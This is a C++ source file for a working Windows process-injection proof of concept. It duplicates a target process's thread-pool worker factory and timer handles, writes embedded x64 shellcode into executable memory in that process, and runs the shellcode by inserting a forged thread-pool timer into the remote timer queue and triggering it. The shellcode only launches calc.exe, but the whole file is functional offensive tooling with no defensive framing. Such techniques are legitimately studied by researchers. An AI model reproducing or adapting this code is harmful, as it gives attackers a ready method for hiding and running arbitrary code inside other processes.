#include <Windows.h>
#include <iostream>
#include <vector>
#include <winternl.h>

#include "ThreadPool.h"
#include "WorkerFactory.h"
#include "Native.h"

#pragma comment(lib, "ntdll")

EXTERN_C
NTSTATUS NTAPI NtQueryInformationWorkerFactory(
	_In_ HANDLE WorkerFactoryHandle,
	_In_ QUERY_WORKERFACTORYINFOCLASS WorkerFactoryInformationClass,
	_In_reads_bytes_(WorkerFactoryInformationLength) PVOID WorkerFactoryInformation,
	_In_ ULONG WorkerFactoryInformationLength,
	_Out_opt_ PULONG ReturnLength
);

EXTERN_C
NTSTATUS NTAPI NtSetInformationWorkerFactory(
	_In_ HANDLE WorkerFactoryHandle,
	_In_ SET_WORKERFACTORYINFOCLASS WorkerFactoryInformationClass,
	_In_reads_bytes_(WorkerFactoryInformationLength) PVOID WorkerFactoryInformation,
	_In_ ULONG WorkerFactoryInformationLength
);

EXTERN_C
NTSTATUS NTAPI NtSetTimer2(
	_In_ HANDLE TimerHandle,
	_In_ PLARGE_INTEGER DueTime,
	_In_opt_ PLARGE_INTEGER Period,
	_In_ PT2_SET_PARAMETERS Parameters
);

unsigned char g_Shellcode[] =
"\xE8\xBA\x00\x00\x00\x48\x8D\xB8\x9E\x00\x00\x00"
"\x48\x31\xC9\x65\x48\x8B\x41\x60\x48\x8B\x40\x18"
"\x48\x8B\x70\x20\x48\xAD\x48\x96\x48\xAD\x48\x8B"
"\x58\x20\x4D\x31\xC0\x44\x8B\x43\x3C\x4C\x89\xC2"
"\x48\x01\xDA\x44\x8B\x82\x88\x00\x00\x00\x49\x01"
"\xD8\x48\x31\xF6\x41\x8B\x70\x20\x48\x01\xDE\x48"
"\x31\xC9\x49\xB9\x47\x65\x74\x50\x72\x6F\x63\x41"
"\x48\xFF\xC1\x48\x31\xC0\x8B\x04\x8E\x48\x01\xD8"
"\x4C\x39\x08\x75\xEF\x48\x31\xF6\x41\x8B\x70\x24"
"\x48\x01\xDE\x66\x8B\x0C\x4E\x48\x31\xF6\x41\x8B"
"\x70\x1C\x48\x01\xDE\x48\x31\xD2\x8B\x14\x8E\x48"
"\x01\xDA\x49\x89\xD4\x48\xB9\x57\x69\x6E\x45\x78"
"\x65\x63\x00\x51\x48\x89\xE2\x48\x89\xD9\x48\x83"
"\xEC\x30\x41\xFF\xD4\x48\x83\xC4\x30\x48\x83\xC4"
"\x10\x48\x89\xC6\x48\x89\xF9\x48\x31\xD2\x48\xFF"
"\xC2\x48\x83\xEC\x20\xFF\xD6\xEB\xFE\x48\x8B\x04"
"\x24\xC3\C:\\Windows\\System32\\calc.exe\x00";


int main(int argc, char* argv[])
{
	HANDLE hTargetProcess = nullptr;
	HANDLE hTpWorkFactory = nullptr;
	DWORD TargetPID = 0;

	TargetPID = atoi(argv[1]);
	//TargetPID = 1111;

	hTargetProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, TargetPID);
	if (hTargetProcess == INVALID_HANDLE_VALUE) {
		printf("[-] OpenProcess failed: 0x%08X\n", GetLastError());
		return 1;
	}

	printf("[+] Opened a remote handle to the target process %d: 0x%p\n", TargetPID, hTargetProcess);

	ULONG InformationLength = 0;
	auto status = 0x0;
	std::vector<BYTE> Information;

	do {
		Information.resize(InformationLength);
		status = NtQueryInformationProcess(hTargetProcess, (PROCESSINFOCLASS)51, Information.data(), InformationLength, &InformationLength);
	} while (status == 0xffffffffc0000004);

	if (status != 0x0) {
		printf("[-] NtQueryInformationProcess failed.\n");
		CloseHandle(hTargetProcess);
		return 1;
	}

	const auto pProcessHandleInformation = (PPROCESS_HANDLE_SNAPSHOT_INFORMATION)(Information.data());

	HANDLE hDuplicatedWorkerFactory = INVALID_HANDLE_VALUE;
	HANDLE hDuplicateTimerProcess = INVALID_HANDLE_VALUE;
	std::vector<BYTE> pObjectInformation;
	PPUBLIC_OBJECT_TYPE_INFORMATION pObjectTypeInformation;

	for (auto i = 0; i < pProcessHandleInformation->NumberOfHandles; i++) {

		BOOL bResult = DuplicateHandle(hTargetProcess, pProcessHandleInformation->Handles[i].HandleValue, GetCurrentProcess(), &hDuplicatedWorkerFactory, WORKER_FACTORY_ALL_ACCESS, FALSE, NULL);

		if (bResult == 0x0) {
			printf("[-] DuplicateHandle failed.\n");
			CloseHandle(hTargetProcess);
			return 1;
		}

		ULONG InformationLen = 0;
		do {

			pObjectInformation.resize(InformationLen);
			status = NtQueryObject(hDuplicatedWorkerFactory, (OBJECT_INFORMATION_CLASS)2, pObjectInformation.data(), InformationLen, &InformationLen);

		} while (status == 0xffffffffc0000004);

		if (status != 0x0) {
			printf("[-] NtQueryObject failed.\n");
			CloseHandle(hTargetProcess);
			return 1;
		}

		pObjectTypeInformation = (PPUBLIC_OBJECT_TYPE_INFORMATION)pObjectInformation.data();

		printf("\t\t%ls - 0x%p\n", (wchar_t*)pObjectTypeInformation->TypeName.Buffer, hDuplicatedWorkerFactory);

		if (wcscmp(L"TpWorkerFactory", pObjectTypeInformation->TypeName.Buffer) == 0) {
			printf("[+] Duplicated a TpWorkerFactory handle: 0x%p\n", hDuplicatedWorkerFactory);
			break;
		}

		continue;
	}

	if (hDuplicatedWorkerFactory == INVALID_HANDLE_VALUE) {
		printf("[-] Failed to duplicate TpWorkerFactory handle.\n");
		CloseHandle(hTargetProcess);
		return 1;
	}


	for (auto i = 0; i < pProcessHandleInformation->NumberOfHandles; i++) {

		BOOL bResult = DuplicateHandle(hTargetProcess, pProcessHandleInformation->Handles[i].HandleValue, GetCurrentProcess(), &hDuplicateTimerProcess, TIMER_ALL_ACCESS, FALSE, NULL);

		if (bResult == 0x0) {
			printf("[-] DuplicateHandle failed.\n");
			CloseHandle(hTargetProcess);
			return 1;
		}

		ULONG InformationLen = 0;
		do {

			pObjectInformation.resize(InformationLen);
			status = NtQueryObject(hDuplicateTimerProcess, (OBJECT_INFORMATION_CLASS)2, pObjectInformation.data(), InformationLen, &InformationLen);

		} while (status == 0xffffffffc0000004);

		if (status != 0x0) {
			printf("[-] NtQueryObject failed.\n");
			CloseHandle(hTargetProcess);
			return 1;
		}

		pObjectTypeInformation = (PPUBLIC_OBJECT_TYPE_INFORMATION)pObjectInformation.data();

		printf("\t\t%ls - 0x%p\n", (wchar_t*)pObjectTypeInformation->TypeName.Buffer, hDuplicateTimerProcess);

		if (wcscmp(L"IRTimer", pObjectTypeInformation->TypeName.Buffer) == 0) {
			printf("[+] Duplicated a TimerProcess handle: 0x%p\n", hDuplicateTimerProcess);
			break;
		}

		continue;
	}

	if (hDuplicateTimerProcess == INVALID_HANDLE_VALUE) {
		printf("[-] Failed to duplicate TimerProcess handle.\n");
		CloseHandle(hTargetProcess);
		return 1;
	}

	// 03 - Allocate shellcode memory in the targer process

	PVOID ShellCodeAddress = nullptr;
	ShellCodeAddress = VirtualAllocEx(hTargetProcess, nullptr, sizeof(g_Shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (ShellCodeAddress == nullptr) {
		printf("[-] VritualAllocEx failed.\n");
		CloseHandle(hTargetProcess);
		CloseHandle(hDuplicatedWorkerFactory);
		CloseHandle(hDuplicateTimerProcess);
		return 1;
	}

	printf("[+] Allocated shellcode memory to the target process: 0x%p\n", ShellCodeAddress);

	// 04 - Write shellcode in the targer process

	BOOL bResult = WriteProcessMemory(hTargetProcess, ShellCodeAddress, g_Shellcode, sizeof(g_Shellcode), nullptr);

	if (bResult == 0x0) {
		printf("[-] WriteProcessMemory failed.\n");
		CloseHandle(hTargetProcess);
		CloseHandle(hDuplicatedWorkerFactory);
		CloseHandle(hDuplicateTimerProcess);
		return 1;
	}

	printf("[+] Written shellcode to the target process.\n");

	// 05 - retrieve target worker factory basic information

	WORKER_FACTORY_BASIC_INFORMATION WorkerFactoryInformation = { 0 };

	status = NtQueryInformationWorkerFactory(hDuplicatedWorkerFactory, WorkerFactoryBasicInformation, &WorkerFactoryInformation, sizeof(WorkerFactoryInformation), nullptr);
	if (status != 0x0) {
		printf("[-] NtQueryInformationWorkerFactory failed.\n");
		CloseHandle(hTargetProcess);
		CloseHandle(hDuplicatedWorkerFactory);
		CloseHandle(hDuplicateTimerProcess);
		return 1;
	}

	PFULL_TP_TIMER pTpTimer = (PFULL_TP_TIMER)CreateThreadpoolTimer((PTP_TIMER_CALLBACK)ShellCodeAddress, nullptr, nullptr);
	if (pTpTimer == nullptr) {
		printf("[-] CreateThreadpoolTimer failed.\n");
		CloseHandle(hTargetProcess);
		CloseHandle(hDuplicatedWorkerFactory);
		CloseHandle(hDuplicateTimerProcess);
		return 1;
	}

	PFULL_TP_TIMER RemoteTpTimerAddress = (PFULL_TP_TIMER)VirtualAllocEx(hTargetProcess, nullptr, sizeof(FULL_TP_TIMER), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	if (RemoteTpTimerAddress == nullptr) {
		printf("[-] VirtualAllocEx failed.\n");
		CloseHandle(hTargetProcess);
		CloseHandle(hDuplicatedWorkerFactory);
		CloseHandle(hDuplicateTimerProcess);
		return 1;
	}

	const auto Timeout = -10000000;
	pTpTimer->Work.CleanupGroupMember.Pool = (PFULL_TP_POOL)(WorkerFactoryInformation.StartParameter);
	pTpTimer->DueTime = Timeout;
	pTpTimer->WindowStartLinks.Key = Timeout;
	pTpTimer->WindowEndLinks.Key = Timeout;
	pTpTimer->WindowStartLinks.Children.Flink = &RemoteTpTimerAddress->WindowStartLinks.Children;
	pTpTimer->WindowStartLinks.Children.Blink = &RemoteTpTimerAddress->WindowStartLinks.Children;
	pTpTimer->WindowEndLinks.Children.Flink = &RemoteTpTimerAddress->WindowEndLinks.Children;
	pTpTimer->WindowEndLinks.Children.Blink = &RemoteTpTimerAddress->WindowEndLinks.Children;

	bResult = WriteProcessMemory(hTargetProcess, RemoteTpTimerAddress, pTpTimer, sizeof(FULL_TP_TIMER), nullptr);
	if (bResult == 0x0) {
		printf("[-] WriteProcessMemory failed.\n");
		CloseHandle(hTargetProcess);
		CloseHandle(hDuplicatedWorkerFactory);
		CloseHandle(hDuplicateTimerProcess);
		return 1;
	}

	auto TpTimerWindowStartLinks = &RemoteTpTimerAddress->WindowStartLinks;
	bResult = WriteProcessMemory(hTargetProcess, 
		&pTpTimer->Work.CleanupGroupMember.Pool->TimerQueue.AbsoluteQueue.WindowStart.Root,
		(PVOID)(&TpTimerWindowStartLinks),
		sizeof(TpTimerWindowStartLinks),
		nullptr);

	if (bResult == 0x0) {
		printf("[-] WriteProcessMemory failed.\n");
		CloseHandle(hTargetProcess);
		CloseHandle(hDuplicatedWorkerFactory);
		CloseHandle(hDuplicateTimerProcess);
		return 1;
	}

	auto TpTimerWindowEndLinks = &RemoteTpTimerAddress->WindowEndLinks;
	bResult = WriteProcessMemory(hTargetProcess,
		&pTpTimer->Work.CleanupGroupMember.Pool->TimerQueue.AbsoluteQueue.WindowEnd.Root,
		(PVOID)(&TpTimerWindowEndLinks),
		sizeof(TpTimerWindowStartLinks),
		nullptr);

	if (bResult == 0x0) {
		printf("[-] WriteProcessMemory failed.\n");
		CloseHandle(hTargetProcess);
		CloseHandle(hDuplicatedWorkerFactory);
		CloseHandle(hDuplicateTimerProcess);
		return 1;
	}

	LARGE_INTEGER ulDuelTime = { 0 };
	ulDuelTime.QuadPart = Timeout;
	T2_SET_PARAMETERS Parameters = { 0 };
	
	status = NtSetTimer2(hDuplicateTimerProcess, &ulDuelTime, 0, &Parameters);

	if (status != 0x0) {
		printf("[-] NtSetTimer2 failed.\n");
		CloseHandle(hTargetProcess);
		CloseHandle(hDuplicatedWorkerFactory);
		CloseHandle(hDuplicateTimerProcess);
		return 1;
	}

	printf("[+] Done.\n");
	CloseHandle(hTargetProcess);
	CloseHandle(hDuplicatedWorkerFactory);
	CloseHandle(hDuplicateTimerProcess);
	return 0;
}
